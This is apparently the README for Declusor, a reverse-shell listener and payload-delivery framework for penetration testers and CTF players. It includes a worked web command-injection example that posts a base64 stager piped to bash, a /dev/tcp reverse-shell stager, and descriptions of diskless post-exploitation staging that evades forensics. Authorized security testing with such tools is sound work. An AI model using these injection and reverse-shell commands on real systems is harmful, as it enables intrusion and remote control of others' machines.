<div align="center">

  <h1>Declusor</h1>

  <p>
    <strong>A fast, modular, and extensible reverse-shell framework and payload delivery handler for security professionals and CTF players.</strong>
  </p>

  <p>
    <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
    <a href="https://www.python.org/"><img src="https://img.shields.io/badge/python-3.11%2B-blue.svg" alt="Python 3.11+"></a>
    <a href="https://pypi.org/project/declusor/"><img src="https://img.shields.io/pypi/v/declusor.svg" alt="PyPI version"></a>
    <a href="https://mypy.readthedocs.io/"><img src="https://img.shields.io/badge/typing-strict-brightgreen.svg" alt="Typing: Strict"></a>
    <a href="https://docs.astral.sh/ruff/"><img src="https://img.shields.io/badge/code%20style-ruff-orange.svg" alt="Code Style: Ruff"></a>
  </p>

  <p>
    <a href="#why-declusor">Why Declusor</a> •
    <a href="#see-it-in-action">Demo</a> •
    <a href="#key-capabilities">Capabilities</a> •
    <a href="#getting-started">Quickstart</a> •
    <a href="#real-world-workflow--usage">Usage</a> •
    <a href="#extensible-plugin-ecosystem">Plugins</a> •
    <a href="#architectural-highlights">Architecture</a> •
    <a href="#contributing--quality-gates">Contributing</a>
  </p>

</div>

## Why Declusor?

Catching a reverse shell during a penetration test, CTF, or security assessment shouldn't feel like walking a tightrope:

- **Netcat is a little too minimal**: You get your shell, hit `Ctrl+C` by accident, and suddenly you're back to Googling PTY one-liners, running `stty raw -echo`, and hoping your next binary transfer doesn't eat the connection.
- **Many C2 frameworks are a bit much**: Sometimes you just want to catch a shell and run `id`. You don't need twelve containers, a database, and a team server for that.
- **Raw sockets don't handle drama well**: A few lines of socket code work great — until the connection drops, binary data shows up, or the shell does something you didn't expect.

### Declusor solves this with quiet elegances

It keeps the zero-infrastructure, instant startup of a standard netcat listener while wrapping the session in a structured, framed transport protocol.

It generates purpose-built stagers, negotiates an in-memory handshake with explicit acknowledgments, and provides a readline-powered REPL on top. The result is a session that doesn't require manual PTY gymnastics or leave you debugging socket desynchronization when things get messy — all from a single lightweight command.

## See It in Action

<p align="center">
  <img src="docs/assets/demo.gif" alt="Declusor Interactive Demo" width="900" onerror="this.onerror=null;this.src='https://i.imgur.com/Wsw2l90.gif';"/>
  <br>
  <em>From listener startup to remote execution in seconds: Catching a reverse shell, navigating with tab-completion, and staging modules in-memory.</em>
</p>

When an operator launches Declusor, the entire engagement workflow is automated:

<div align="center">

| Step | Phase                 | Operator Experience                          | Target Impact                         |
| ---: | :-------------------- | :------------------------------------------- | :------------------------------------ |
|    1 | Listener Launch       | Single CLI command (`declusor 0.0.0.0 4444`) | Prints pre-formatted stager one-liner |
|    2 | Session Establishment | Automatic connection detection & handshake   | Zero manual PTY stabilization needed  |
|    3 | Command Dispatch      | Framed streaming with tab-completion         | Output streamed back chunk-by-chunk   |
|    4 | Post-Exploitation     | In-memory module loading (`load ...`)        | Execution memory-resident; clean exit |

</div>

In other words, Declusor handles the operational details around the session rather than leaving them to the operator:

1. Starts the listener and immediately displays ready-to-inject launcher commands for the target environment.
2. Upon connection, the framework verifies the remote transport, transmits helper libraries in-memory, and negotiates framed communication with sentinel ACKs to prevent socket desynchronization.
3. Provides full command recall (`Up`/`Down`), history search (`Ctrl+R`), and tab-completion for remote executables and local paths.
4. Modules and post-exploitation scripts are staged directly into remote process memory, eliminating temporary files in `/tmp` and minimizing disk forensics.

## Real-World Workflow Examples

### 1. Start the Listener

Start Declusor by specifying your local listening IP and port:

```bash
# Default listener (uses native shell_socket client)
declusor 0.0.0.0 4444

# Select the cross-platform Python client
declusor 0.0.0.0 4444 --plugin py_socket

# Load external custom plugins from an operator directory
declusor 0.0.0.0 4444 --plugin-dir ~/custom_plugins --plugin my_agent
```

On startup, Declusor initializes the listener and **prints the exact one-liner launcher command** to run on your target.

### 2. Built-in Client Transports

| Client Plugin     | Flag              | Target OS             | Execution Mechanism                                                    |
| :---------------- | :---------------- | :-------------------- | :--------------------------------------------------------------------- |
| **Shell Socket**  | `-c shell_socket` | Linux / POSIX         | Native `/dev/tcp` file descriptor; zero external dependencies          |
| **Python Socket** | `-c py_socket`    | Linux, macOS, Windows | In-memory `exec()` with persistent session scope & subprocess fallback |

### 3. Interact with the Session

Once your target connects back, Declusor drops you into an interactive session:

```text
[declusor] help
help    : Display detailed information about available commands or a specific command.
load    : Load a payload module from your local system and execute it on the remote system.
command : Execute a single command on the remote system.
shell   : Initiate an interactive shell session on the remote system.
upload  : Upload a file from the local system to the remote system.
execute : Execute a program or script from the local system on the remote system.
exit    : Terminate the session and exit the program.
```

#### Example: Running Commands

```text
[declusor] command id && uname -a
uid=1000(dev) gid=1000(dev) groups=1000(dev),27(sudo)
Linux target-node 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC x86_64 GNU/Linux
```

#### Example: In-Memory Module Loading

```text
[declusor] load discovery/system_info.py

SYSTEM INFORMATION
------------------
OS: Linux 6.8.0-45-generic (#45-Ubuntu SMP PREEMPT_DYNAMIC)
Architecture: x86_64
Hostname: target-host
User: dev
```

## Practical Usage Examples

Declusor is purpose-built to turn unauthenticated Remote Code Execution (RCE) and Command Injection vulnerabilities into stable, feature-rich operator sessions.

### Web OS Command Injection

When testing an injection point in an HTTP query or form parameter (e.g., a vulnerable diagnostic `ping` or export function):

```http
POST /api/diagnostics/ping HTTP/1.1
Host: target.local
Content-Type: application/json

{"ip": "127.0.0.1; <STAGER_PAYLOAD>"}
```

**1. Start Declusor locally on your interface:**

```bash
declusor 127.0.0.1 4444 --plugin shell_socket
```

**2. Declusor will immediately print the tailored launcher one-liner. Base64-encode it to avoid character-filtering issues (`&`, `;`, `|`, spaces):**

```bash
# Encode the stager displayed by Declusor
PAYLOAD=$(echo -n '<DECLUSOR_BASH_STAGER>' | base64 -w0)

# Inject via curl
curl -s -X POST https://target.example/api/diagnostics/ping \
     -H "Content-Type: application/json" \
     -d "{\"ip\": \"127.0.0.1; echo $PAYLOAD | base64 -d | bash\"}"
```

**3. Upon connection, Declusor runs its in-memory handshake, pushes helper utilities, and opens an interactive REPL with full history and tab-completion.**

```console
$ declusor 127.0.0.1 4444
( exec 3<> /dev/tcp/127.0.0.1/4444; [...] >&3; done <&3; exec 3>&- )

[declusor]
```

## Key Capabilities

### Operator Console & Terminal Ergonomics

- **Context-Aware Readline REPL**: Interactive command loop with intelligent tab-completion for command verbs, remote target arguments, and local filesystem paths.
- **Persistent History & Navigation Safety**: Maintains cross-session command history and insulates the connection against drops caused by unhandled arrow keys or terminal escape sequences.
- **Real-Time Stream Delivery & Diagnostics**: Streams remote stdout/stderr chunks in real time, accompanied by dedicated diagnostic reporting and structured tabular formatting.

### Remote Execution & Payload Delivery Primitives

- **Framed Remote Command Dispatch (`command`)**: Executes individual commands on the remote target with framing sentinels that prevent socket desynchronization.
- **Diskless In-Memory Script Staging (`execute`)**: Streams local scripts directly into remote process memory, eliminating on-disk forensic artifacts in temporary directories.
- **Chunked Binary Staging & Uploads (`upload`)**: Transfers reconnaissance, enumeration, and privilege-escalation binaries via framed byte chunks.
- **Directory-Isolated Modular Payloads (`load`)**: Stages and executes modular post-exploitation tasks directly from local module directories with strict argument boundaries.
- **Direct Interactive Shell Pass-Through (`shell`)**: Transitions from structured framed dispatch to an unconstrained, interactive shell session whenever raw terminal access is required.

### Extensible Transports & Autonomous Plugins

- **Three-Tier Dynamic Plugin Discovery**: Discovers transport plugins across repository built-ins, installed distribution packages (PEP 621 entry points), and drop-in operator directories (`--plugin-dir`).
- **Decoupled Transport Protocols & Agents**: Bundles native Linux `/dev/tcp` (`shell_socket`) and in-memory Python (`py_socket`) clients with zero hardcoded dependencies on the core orchestration engine.
- **Contract-First Interface Isolation**: Enforces strict domain contracts (`IPlugin`, `IPluginRuntime`, `IConnection`) with isolated asset overlays for launchers, initialization helpers, and payloads.
- **Deterministic Conformance Test Suite**: Equips plugin authors with `PluginConformanceTestSuite` and typed test doubles to verify full contract compliance in milliseconds without brittle mocks.

## Getting Started

### Prerequisites

Declusor requires **Python 3.11+** and runs natively on Linux, macOS, and Windows. Package management requires **pip** or optionally—and recommended—[**uv**](https://github.com/astral-sh/uv) and **GNU Make** for fast and standardized workflows.

### Installation

#### Option A: Isolated CLI Install (Recommended for Operators)

Install directly into an isolated environment using [uv](https://github.com/astral-sh/uv), [pipx](https://pypa.github.io/pipx/), or standard `pip`:

```bash
# Using uv (fastest)
uv tool install declusor
# or run ephemerally without installing
uvx declusor 0.0.0.0 4444

# Using pipx
pipx install declusor

# Using pip
pip install declusor
```

#### Option B: Fast Development Setup with `uv` (Recommended for Contributors)

Clone the repository and let `make install` configure your virtual environment, sync all dependencies, and link all native plugins in editable mode:

```bash
git clone https://github.com/othonhugo/declusor.git
cd declusor

# Option B1: Using Make (recommended, runs uv sync + installs editable plugins)
make install

# Option B2: Using uv directly
uv sync
make install-plugins
# (or: uv pip install -e plugins/shell_socket -e plugins/py_socket)
```

#### Option C: Standard Virtualenv Setup with `pip`

```bash
git clone https://github.com/othonhugo/declusor.git
cd declusor

# Create and activate virtual environment
python3 -m venv .venv && source .venv/bin/activate

# Install host package and development tools
pip install -e ".[dev,testing]"

# Install native plugins in editable mode
make install-plugins
# (or: pip install -e plugins/shell_socket -e plugins/py_socket)
```

## Extensible Plugin Ecosystem

Declusor was architected from day one as an extensible engine. Transport plugins are fully autonomous packages with their own manifests, assets, and tests:

```text
plugins/<plugin_name>/
├── pyproject.toml                # Standalone package metadata & entry-point declaration
├── README.md                     # Documentation (## Modules and ## Design Principles)
├── src/declusor_<plugin_name>/   # Core transport and runtime implementation
│   ├── __init__.py               # Public exports (__all__ = ["<PluginClass>"])
│   ├── plugin.py                 # Implements IPlugin & IPluginRuntime
│   └── connection.py             # Implements IConnection, IConnectionProfile, IClientFileStore
├── assets/                       # Bundled stagers and operational payloads
│   ├── launchers/                # Client bootstrap templates (e.g. client.sh, client.py)
│   ├── helpers/                  # In-memory initialization libraries (sent during handshake)
│   └── modules/                  # On-demand reconnaissance and post-exploitation payloads
└── tests/                        # Dedicated unit & contract conformance test suite
    └── test_conformance.py       # Inherits from PluginConformanceTestSuite
```

### Multi-Tier Dynamic Discovery

Declusor discovers plugins at runtime across three distinct source tiers with zero hardcoded coupling:

1. **Built-in Plugins**: Shipped repository packages located in `plugins/`.
2. **Python Entry Points**: Standard distribution packages registered via PEP 621 entry points (`[project.entry-points."declusor.plugins"]`).
3. **Operator Drop-in Folders**: Custom plugin directories loaded dynamically on the fly via `--plugin-dir <path>`.

For complete packaging tutorials, asset overlay mechanics, and step-by-step guides, check out the [Plugins Developer Guide](plugins/README.md).

## Architectural Highlights

Declusor adheres to strict **Clean Architecture** and **Dependency Inversion** principles:

- **Unidirectional Layer Boundaries**: Dependencies flow downward into pure domain contracts (`declusor.contract`). Core framework code never imports concrete plugins.
- **Fail-Fast Invariants**: Immutable Command DTOs validate parameters at the boundary, preventing invalid operations from propagating into transports.
- **Deterministic Flow Control**: Controllers return explicit lifecycle signals (`CONTINUE`, `TERMINATE`) rather than relying on control-flow exceptions.
- **100% Strict Static Typing**: Fully typed with strict mypy enforcement across core, native plugins, and tests.

Read the complete architectural specification in [ARCHITECTURE.md](ARCHITECTURE.md).

## Contributing & Quality Gates

Contributions from both humans and autonomous agents are warmly welcomed! Please read our [CONTRIBUTING.md](CONTRIBUTING.md) guide before opening a pull request.

## License

This project is open-source software licensed under the [MIT License](LICENSE).

---

> [!WARNING]
> **Legal Disclaimer**: Declusor is intended solely for educational purposes and authorized security research. The authors assume no liability for misuse. Executing this software against systems without explicit, prior written authorization is strictly prohibited.
